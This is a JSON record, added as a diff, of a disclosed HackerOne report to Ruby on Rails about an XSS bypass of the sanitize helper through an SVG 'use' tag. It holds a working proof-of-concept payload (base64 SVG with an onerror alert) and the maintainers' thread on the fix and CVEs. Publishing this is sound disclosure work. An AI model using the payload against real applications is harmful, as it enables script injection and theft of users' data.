@@ -1,0 +1,375 @@
+{
+    "id": 1694173,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjk0MTcz",
+    "url": "https://hackerone.com/reports/1694173",
+    "title": "ActionView sanitize helper bypass leading to XSS using SVG tag.",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "medium",
+    "readable_substate": "Resolved",
+    "created_at": "2022-09-07T21:38:41.383Z",
+    "submitted_at": "2022-09-07T21:38:41.443Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "haqpl",
+        "url": "/haqpl",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/nqha2oi4mj36dljeq1anfuiul7lj/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 22,
+        "url": "https://hackerone.com/rails",
+        "handle": "rails",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Ruby on Rails",
+            "twitter_handle": "rails",
+            "website": "http://rubyonrails.org/security",
+            "about": "Web development that doesn't hurt."
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [
+        "CVE-2022-23515",
+        "CVE-2022-23518"
+    ],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2023-07-10T13:21:43.554Z",
+    "bug_reporter_agreed_on_going_public_at": "2023-07-10T13:21:43.447Z",
+    "team_member_agreed_on_going_public_at": "2023-06-28T00:50:09.478Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "In the specific configuration, it was possible to bypass HTML sanitization by using the `use` tag of the `SVG` element.\n\nIn the `index.html.erb`:\n\n```ruby\n<%= sanitize \"<svg><use href=\\\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x\\\"/></svg>\", tags: %w(svg use) %>\n```\n`use` tag allows to embed another base64 encoded `SVG` containing target XSS payload, base64 after decoding:\n\n```svg\n<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='1337' height='1337'>\n<image href=\"1\" onerror=\"alert(window.origin)\" />\n</svg>\n```\n`SVG` and `use` tags had to be allowed either in global configuration  `config.action_view.sanitized_allowed_tags = ['svg', 'use']`\nor inline with `tags` argument of the helper.\n\n## Impact\n\nXSS could lead to data theft through the attacker’s ability to manipulate data through their access to the application, and their ability to interact with other users, including performing other malicious attacks, which would appear to originate from a legitimate user. These malicious actions could also result in reputational damage for the business through the impact on customers’ trust.",
+    "weakness": {
+        "id": 60,
+        "name": "Cross-site Scripting (XSS) - Generic"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 1912214,
+            "file_name": "2022-09-07_23-29.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/t467idn0875wopphu4p1hgwc1qzk?response-content-disposition=attachment%3B%20filename%3D%222022-09-07_23-29.png%22%3B%20filename%2A%3DUTF-8%27%272022-09-07_23-29.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRBXMBUE6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T074605Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCi%2Fn6Cuuxp8BfcjTDd0Y9WigKVjgyi8j4AO7gsBX4FkgIgM1DkBhRrbtZdh9zvama2O2%2BFkhu4R3JfNLeArgwjhOAqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDiZPbgxzHZzAExCLSqOBctgXCfx1Fa7AX6HsYswOvCc35utfZkDrc7UQKSKOObn33qUOHImqsmg1wBfGgt0Bf4Ld2KhcHDX5WmiV5wKZRxm2jyLLjaFeM7AY0qNUCpekBDnmej55N%2Bx2itZfrdp06kGXTLFqxQJqR%2F7fw4L7HgYS6R2Vbkvy%2Fin1mfZP53zj2NFZI0gU9UoDAXAXxPYrgcn%2FX3he5T3kNoKtmAwh7yZ7TJK3FnqKTf1ldJtVEkzkV4Gpt1p2WgnICaNOccEVTIapnoEdqrATCq425iwMn2odQ9pvPuCKdorhmrrgf%2Bii5aedaaXwKafxmzCNESo9saERi1IaigwHAgWvgMgQELHLSB6%2FAwE9nTcpNYbfqGQsWgM8MElgGaWLAvPThcAG96px99ws1oxTn%2BccSHae1P17vTvPjU47N1VJDvsnvT4MUtSKlO3zF%2BwlPSLFMEJkSnMQcbVJaryZ9bCZj4TPK8AgyEk7NrGfDN0OY7o4ospMjqVeDm2uG97qtQMawHik7TRI1uf50GuJoF5ae6hZX%2BkS7M%2FwrOoHKpjcRvom4OAmjA2aORQX2p7z5PULOCogNHumNZc0ItMuq3Gr4tkbWhkKbOhj3tkrkh8Z1N%2BSvAgH5ivb7uDpbJ4kYF8eMcd8W31vOiHXyLHfL6t2VcshH4TSWC5CzJMpP4t1RAZXBbpMcSQGpMmYwtnRG%2FQ5dna7ontKbsvZmfhAH2mrw%2Fu%2BD5J6womLkE%2BHlh70m0Q7WNMnmUVWk%2FLw10aiAGYM5eGkWyM0XKUPw42b8UGbkGEuYvt7jDypeJSGBTbSOAv7i04kc0LbvXl1ZTdxuCdI1v%2BA0Tsfg43RPylGdoYcwqkOnIEJtLk6LYRzawXkV0pKjDhsLanBjqxAbQsXE60gBC8f3kMM4sUI9nub28aKMZYhJ8Cu5NYpheRyStUS1ow996%2BG5KR7E7oTS%2FC1WnM6eF%2F%2FY5k%2Bjy%2BflQr2erEsM06u4ahe%2BWCmsFT6l1jMLR6qOgKu%2BtGze%2FKfNgwH5Qe059Kz9enTuUPfZGgKn2aSyoRr7hexI6oTaN%2FEmzyQroXrurH6MYRtTID3oiBLMQ7F%2FyLfZF%2B4X%2BLRiNHZA8cnpiBq4JPKbRfceBIdA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=32993ddb1cd620bf18f920d0ace84f4e8ab6512c770ded0b2dd8effe71cdb53c",
+            "file_size": 220557,
+            "type": "image/png"
+        }
+    ],
+    "allow_singular_disclosure_at": "2023-07-28T00:50:09.599Z",
+    "allow_singular_disclosure_after": -2789755.738110444,
+    "singular_disclosure_allowed": true,
+    "vote_count": 11,
+    "voters": [
+        "zy9ard3",
+        "sudi",
+        "ich4l",
+        "shivammusic",
+        "salman_hunted",
+        "br0wni3",
+        "iam_1337",
+        "saavanx",
+        "r34l",
+        "63n0",
+        "and 1 more..."
+    ],
+    "severity": {
+        "rating": "medium",
+        "author_type": "User"
+    },
+    "structured_scope": {
+        "databaseId": 160,
+        "asset_type": "SOURCE_CODE",
+        "asset_identifier": "https://github.com/rails/rails",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 18289792,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thank you for reporting what you're seeing. We've received your report and will investigate.",
+            "automated_response": false,
+            "created_at": "2022-09-07T21:57:27.374Z",
+            "updated_at": "2022-09-07T21:57:27.374Z",
+            "actor": {
+                "username": "flavorjones",
+                "cleared": false,
+                "verified": false,
+                "url": "/flavorjones",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rails"
+        },
+        {
+            "id": 19264549,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Hi, thanks for your patience. I've confirmed this is a vulnerability and am planning to fix it in an upcoming security release of Rails::Html::Sanitizer and Loofah. I'll generate a CVE and credit you in the notice. Thank you!",
+            "automated_response": false,
+            "created_at": "2022-11-18T05:59:49.706Z",
+            "updated_at": "2022-11-18T05:59:49.706Z",
+            "actor": {
+                "username": "flavorjones",
+                "cleared": false,
+                "verified": false,
+                "url": "/flavorjones",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rails"
+        },
+        {
+            "id": 19278937,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "hi, thank you for the update!",
+            "automated_response": false,
+            "created_at": "2022-11-19T11:30:01.477Z",
+            "updated_at": "2022-11-19T11:30:01.477Z",
+            "actor": {
+                "username": "haqpl",
+                "cleared": false,
+                "verified": false,
+                "url": "/haqpl",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/nqha2oi4mj36dljeq1anfuiul7lj/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rails"
+        },
+        {
+            "id": 19549344,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::CveIdAdded",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-12-13T13:59:57.484Z",
+            "updated_at": "2022-12-13T13:59:57.484Z",
+            "cve_ids": [
+                "CVE-2022-23515",
+                "CVE-2022-23518"
+            ],
+            "actor": {
+                "username": "flavorjones",
+                "cleared": false,
+                "verified": false,
+                "url": "/flavorjones",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rails"
+        },
+        {
+            "id": 19549350,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "rails-html-sanitizer v1.4.4 and loofah v2.19.1 address this. see https://github.com/flavorjones/loofah/security/advisories/GHSA-228g-948r-83gx and https://github.com/rails/rails-html-sanitizer/security/advisories/GHSA-mcvf-2q2m-x72m.",
+            "automated_response": false,
+            "created_at": "2022-12-13T14:00:28.180Z",
+            "updated_at": "2022-12-13T14:00:28.180Z",
+            "actor": {
+                "username": "flavorjones",
+                "cleared": false,
+                "verified": false,
+                "url": "/flavorjones",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "haqpl",
+                "url": "/haqpl"
+            },
+            "genius_execution_id": null,
+            "team_handle": "rails"
+        },
+        {
+            "id": 19554063,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "hi @flavorjones thank you for the update and CVE generation! Is this submission eligible for the bounty?",
+            "automated_response": false,
+            "created_at": "2022-12-13T16:15:33.119Z",
+            "updated_at": "2022-12-13T16:15:33.119Z",
+            "actor": {
+                "username": "haqpl",
+                "cleared": false,
+                "verified": false,
+                "url": "/haqpl",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/nqha2oi4mj36dljeq1anfuiul7lj/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rails"
+        },
+        {
+            "id": 19555879,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@haqpl Yes, rails-html-sanitizer is part of the Rails project, and so my understanding is that this submission is eligible for bounty. CC @tenderlove to correct me if I'm mistaken.\n\nPlease see https://hackerone.com/rails?type=team for details on how to collect the bounty from IBB.",
+            "automated_response": false,
+            "created_at": "2022-12-13T16:52:20.579Z",
+            "updated_at": "2022-12-13T16:52:20.579Z",
+            "actor": {
+                "username": "flavorjones",
+                "cleared": false,
+                "verified": false,
+                "url": "/flavorjones",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rails"
+        },
+        {
+            "id": 22548010,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2023-06-28T00:50:09.530Z",
+            "updated_at": "2023-06-28T00:50:09.530Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "rafaelfranca",
+                "cleared": false,
+                "verified": false,
+                "url": "/rafaelfranca",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/004/981/dd3b6bb41f9c33e3448ebbc47303f5a135f25105_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rails"
+        },
+        {
+            "id": 22747794,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2023-07-10T13:21:43.500Z",
+            "updated_at": "2023-07-10T13:21:43.500Z",
+            "actor": {
+                "username": "haqpl",
+                "cleared": false,
+                "verified": false,
+                "url": "/haqpl",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/nqha2oi4mj36dljeq1anfuiul7lj/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rails"
+        },
+        {
+            "id": 22747795,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2023-07-10T13:21:43.628Z",
+            "updated_at": "2023-07-10T13:21:43.628Z",
+            "actor": {
+                "username": "haqpl",
+                "cleared": false,
+                "verified": false,
+                "url": "/haqpl",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/nqha2oi4mj36dljeq1anfuiul7lj/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rails"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
